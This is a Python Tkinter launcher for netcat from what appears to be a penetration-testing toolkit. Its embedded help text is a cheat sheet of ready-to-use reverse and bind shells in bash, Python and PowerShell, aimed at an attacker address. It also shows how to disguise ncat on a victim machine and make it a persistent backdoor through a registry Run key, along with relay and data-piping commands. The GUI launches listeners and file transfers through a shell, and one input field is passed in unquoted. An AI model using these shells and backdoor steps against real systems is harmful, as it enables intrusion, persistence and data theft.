#!/usr/bin/env python3

from tkinter import *
from datetime import datetime
import os
import shlex
import subprocess

#Define variables outside functions here:

info = r'''

     ███╗   ██╗███████╗████████╗ ██████╗ █████╗ ████████╗
     ████╗  ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗╚══██╔══╝
     ██╔██╗ ██║█████╗     ██║   ██║     ███████║   ██║
     ██║╚██╗██║██╔══╝     ██║   ██║     ██╔══██║   ██║
     ██║ ╚████║███████╗   ██║   ╚██████╗██║  ██║   ██║
     ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝╚═╝  ╚═╝   ╚═╝

transfer_netcat  -  netcat / ncat  -  the "TCP/IP swiss army knife": listeners,
                    reverse/bind shells, file transfer, port checks, banner grab

nc opens raw TCP/UDP connections.  In a cyberworthiness assessment it is the
minimal way to catch a reverse shell, move a file when nothing else is available,
test connectivity/egress, grab a service banner, or set up a quick relay/port
forward on a pivot.  ncat (nmap's version) adds TLS, --exec and access control.

when to use it
    - catch a callback:  nc -lvnp 4444   (then upgrade the TTY - see exploit_tty_upgrade)
    - test egress from a foothold:  nc -zv <you> 443
    - transfer a file both ends have no better tool for
    - most common use: the reverse-shell listener + one of the payloads at the bottom

nc          #can establish TCP or UDP connection to targeted port
which nc
nc -h

-l #listen
-L #listen harder
-u #UDP
-p #local port, any listening port under 1024 requires Root
-e #run/execute something #mainly works on Windows
-n #no DNS look up/no names
-v #verbose, show connections
-vvv #verbose
-wN #wait for N seconds

nc -lnvp 4444  #create listener
nc -nv IP 4444  #connect
nc -lnvp 4444  -e /bin/sh  #linux shell
nc -lnvp 4444 -e cmd.exe  #win shell
nc -lnvp 4444 < file.txt  #send file
while [ 1 ]; do echo "Started"; nc -lnp 4444 -e /bin/sh; sleep 1; done  #nc loop

nc -lvp 8888 #(server) listening on 0.0.0.0:8888 which is all network interfaces
nc -v 127.0.0.1 8888 #(client) will establish connection on loop back

nc -lvup 9999 #will create UDP connection on 0.0.0.0:9999
nc -vu 127.0.0.1 9999 #will connect using UDP connection


cat tobesend.txt | nc -v 127.0.0.1 8888 #will send file content
can use < or > to move files

nc -l -p PORT -e /bin/sh  #basic linux shell
nc IP_address PORT -e cmd.exe  #basic reverse win shell
cat listener.sh
	while true; do nc -lnp 4444 -e /bin/sh; sleep 1; done  #nc loop

port forwarding:
	on pivot > mkfifo backpipe_name  #first in, first out
	           while true; do nc -l -p 8080 < backpipe_name | nc target_IP 80 > backpipe_name; sleep 1; done
	attacker > nc IP_pivot 8080

no -e option:
	on target > mkfifo backpipe
	            /bin/bash < backpipe | nc -l -p 8080 > backpipe

##################################################################

nc -lvp 1337 -e /bin/bash #server with bash window
	-e #execute command when connection established, not always works
nc -v 127.0.0.1 1337 #all comands now will be executed on the server

##################################################################

www.nmap.org/ncat/ #to install

download ncat to victim machine, rename to winconfig for example and run:
winconfig -l -p 5555 -e cmd.exe #will listen on port 5555 and send commands to execute on cmd
to connect:
ncat IP PORT

to listen on attacker
ncat -l -p 5555 -v
victim
winconfig -e cmd.exe 192.168.102.145 5555

to make persistant back door add hkeys in regit

hkey_local_machine\software\microsoft\windows\currentversion\ run
create new variable winconfig with path to winconfig IP port -e cmd.exe

#################################################################

listener/Atacker
nc -lnvp PORT
if accesed from browser page will return user agent string
url IP:port

target
nc -e /bin/bash Atacker_IP PORT

whoami
uname -a

When connected can send requests
GET / HTTP/1.0
HEAD / HTTP/1.0

echo "" | nc -nvw2 ip portrange #port scanner, jump every 2 sec

#################################################################

Reverse shell:
Attacker
nc -lvnp 1234  #listener

Target/remote host
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"

Bind shell:

Attacker
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f

python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'

powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();

Target/remote host
nc 10.10.10.10 1234  #connect to attackers shell

#################################################################

pair with
    exploit_tty_upgrade      turn a raw nc shell into a real terminal
    exploit_shell_handler    pwncat / penelope - auto-upgrading listener
    info_revshell_generator  build the right payload for the target's interpreters
    transfer_moving_files    the other file-transfer options
    transfer_static_binaries a static nc/ncat to drop on a target that lacks one

gotchas
    - many modern nc builds (OpenBSD, busybox) have NO -e - use the mkfifo one-liner instead
    - -e / GAPING_SECURITY_HOLE is a big AV/EDR signature on Windows
    - traffic is cleartext - use ncat --ssl both ends, or expect NIDS to see the shell
    - a bare listener with no --allow accepts anyone - restrict it (ncat --allow <ip>) on a shared net
    - UDP "connections" are stateless - no confirmation the other end received anything

authorisation & reporting
    - shells, transfers and relays are active - authorised scope only; kill listeners
      and remove any dropped nc binary at teardown
    - report: outbound to arbitrary port allowed a shell (egress finding), cleartext
      C2 not detected, LOLBin/`-e` shell not blocked
    - fix = egress allow-listing + proxy, NIDS/EDR for reverse-shell patterns,
      application allow-listing, block outbound to uncommon ports

ncat ssl encrypted listeners & tar pipes
  ncat ssl encrypted listener:
    ncat --ssl -lvnp 4444

  pipe entire directory through netcat:
    tar cf - . | nc -lvnp 4444
'''

#GUI

#Creates $guibox window to populate all the gui
guibox = Tk()
guibox.title('transfer_netcat  —  netcat - file transfer, shells and port checks')   #window title: tool name + purpose
guibox.geometry("950x900")   #size for the window guibox

#Define functions

def LOG(cmd):
    stamp = datetime.now().strftime("%d-%b-%Y (%H:%M:%S.%f)")
    text_box.insert('end', "\nTime stamp: {} - {}\n".format(stamp, cmd))
    text_box.yview('end')


def RUN_in_terminal(cmd):
    """Fire `cmd` in its own terminal.  Value fields are already shlex.quote()d
    by the caller; quoting the whole command once more keeps a stray quote in a
    free-form switches field from breaking out into the outer shell."""
    subprocess.call(
        ['gnome-terminal -- bash -c ' + shlex.quote(cmd + ' ; exec bash')],
        shell=True,
    )
    LOG(cmd)



def RUN_ncat_ssl_listen():
    port = shlex.quote(lport_entry.get().strip() or "4444")
    cmd = "ncat --ssl -lvnp " + port
    RUN_in_terminal(cmd)

def RUN_LISTEN_nc():
    if not lport_entry.get().strip():
        LOG("LPORT yours/listening port is empty")
        return
    lport = shlex.quote(lport_entry.get().strip())
    switches = switches_entry.get()                    # free-form, left unquoted
    # switches ahead of -lvnp: -p consumes the next argument, so a switch
    # typed here used to be taken as the port and the port as a host name.
    cmd = "nc " + switches + " -lvnp " + lport
    RUN_in_terminal(cmd)


def RUN_CONNECT_nc():
    if not target_entry.get().strip():
        LOG("Target IP is empty")
        return
    if not lport_entry.get().strip():
        LOG("LPORT yours/listening port is empty")
        return
    target = shlex.quote(target_entry.get().strip())
    lport = shlex.quote(lport_entry.get().strip())
    switches = switches_entry.get()                    # free-form, left unquoted
    cmd = "nc -nv " + switches + " " + target + " " + lport
    RUN_in_terminal(cmd)


def RUN_RECEIVE_file():
    if not lport_entry.get().strip():
        LOG("LPORT yours/listening port is empty")
        return
    if not file_entry.get().strip():
        LOG("File to send/receive is empty")
        return
    lport = shlex.quote(lport_entry.get().strip())
    file = shlex.quote(file_entry.get().strip())
    switches = switches_entry.get()                    # free-form, left unquoted
    cmd = "nc " + switches + " -lvnp " + lport + " > " + file
    RUN_in_terminal(cmd)


def RUN_SEND_file():
    if not target_entry.get().strip():
        LOG("Target IP is empty")
        return
    if not lport_entry.get().strip():
        LOG("LPORT yours/listening port is empty")
        return
    if not file_entry.get().strip():
        LOG("File to send/receive is empty")
        return
    target = shlex.quote(target_entry.get().strip())
    lport = shlex.quote(lport_entry.get().strip())
    file = shlex.quote(file_entry.get().strip())
    switches = switches_entry.get()                    # free-form, left unquoted
    cmd = "nc -nv " + switches + " " + target + " " + lport + " < " + file
    RUN_in_terminal(cmd)


def NEW_Terminal():
    subprocess.call(["gnome-terminal"])

#Grid Frames
frame_main = Frame(guibox)
frame_main.grid(row=0, column=0, columnspan=1, padx=5, pady=0, sticky="nsew")
guibox.rowconfigure(0, weight=1)
guibox.columnconfigure(0, weight=1)
frame_main.rowconfigure(1, weight=1)
frame_main.columnconfigure(0, weight=1)

frame_message = Frame(frame_main)
frame_message.grid(row=1, column=0, columnspan=1, padx=5, pady=5, sticky="nsew")

frame_buttons1 = Frame(frame_main)
frame_buttons1.grid(row=2, column=0, columnspan=8, padx=5, pady=0)

#interface
text_box = Text(   #creates text box inside frame_message with info text
    frame_message,
    height=45,
    width=115
)
text_box.grid(row=1)

text_box.insert('end', info)   #adds info to the end of text_box
text_box.pack(side=LEFT, fill=BOTH, expand=True)   #config for slider variant
text_box.yview('1.0')

sb = Scrollbar(frame_message)   #assign scrollbar
sb.pack(side=RIGHT, fill=BOTH)   #scrollbar configuration

text_box.config(yscrollcommand=sb.set)   #set scrollbar on y axis
sb.config(command=text_box.yview)


# --- input fields ------------------------------------------------------
frame_fields = Frame(frame_main)
frame_fields.grid(row=3, column=0, columnspan=8, padx=5, pady=0)

target_label = Label(frame_fields, text="Target IP: ")
target_label.grid(row=0, column=0, padx=5, pady=4, sticky='e')
target_entry = Entry(frame_fields, width=22)
target_entry.grid(row=0, column=1, padx=5, pady=4)
target_entry.insert(0, os.environ.get("SKELETON_TARGET", "10.10.10.10"))

lport_label = Label(frame_fields, text="LPORT yours/listening port: ")
lport_label.grid(row=1, column=0, padx=5, pady=4, sticky='e')
lport_entry = Entry(frame_fields, width=10)
lport_entry.grid(row=1, column=1, padx=5, pady=4)
lport_entry.insert(0, os.environ.get("SKELETON_LPORT", "4444"))

file_label = Label(frame_fields, text="File to send/receive: ")
file_label.grid(row=2, column=0, padx=5, pady=4, sticky='e')
file_entry = Entry(frame_fields, width=30)
file_entry.grid(row=2, column=1, padx=5, pady=4)
file_entry.insert(0, "loot.tar")

switches_label = Label(frame_fields, text="Additional switches: ")
switches_label.grid(row=3, column=0, padx=5, pady=4, sticky='e')
switches_entry = Entry(frame_fields, width=30)   #entry field for extra switches
switches_entry.grid(row=3, column=1, padx=5, pady=4)
switches_entry.insert(0, "")

RUN_LISTEN_nc_button = Button(frame_buttons1, text=" LISTEN nc ", command=RUN_LISTEN_nc)
RUN_LISTEN_nc_button.grid(row=0, column=0, padx=5, pady=5)

RUN_CONNECT_nc_button = Button(frame_buttons1, text=" CONNECT nc ", command=RUN_CONNECT_nc)
RUN_CONNECT_nc_button.grid(row=0, column=1, padx=5, pady=5)

RUN_RECEIVE_file_button = Button(frame_buttons1, text=" RECEIVE file ", command=RUN_RECEIVE_file)
RUN_RECEIVE_file_button.grid(row=0, column=2, padx=5, pady=5)

RUN_SEND_file_button = Button(frame_buttons1, text=" SEND file ", command=RUN_SEND_file)
RUN_SEND_file_button.grid(row=0, column=3, padx=5, pady=5)

NEW_button = Button(frame_buttons1, text=" NEW Terminal ", command=NEW_Terminal)
NEW_button.grid(row=0, column=4, padx=5, pady=5)


NCAT_ssl_btn = Button(frame_buttons1, text=" LISTEN ncat --ssl ", command=RUN_ncat_ssl_listen)
NCAT_ssl_btn.grid(row=0, column=5, padx=5, pady=5)

guibox.mainloop()   #generates guibox window
